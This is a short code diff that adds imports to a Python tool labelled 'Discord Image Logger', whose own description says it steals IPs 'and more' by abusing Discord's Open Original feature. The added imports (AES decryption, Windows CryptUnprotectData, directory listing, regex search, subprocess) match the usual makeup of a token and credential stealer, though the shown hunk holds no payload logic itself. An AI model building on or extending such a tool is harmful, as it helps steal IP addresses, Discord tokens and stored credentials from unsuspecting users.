@@ -4,6 +4,16 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
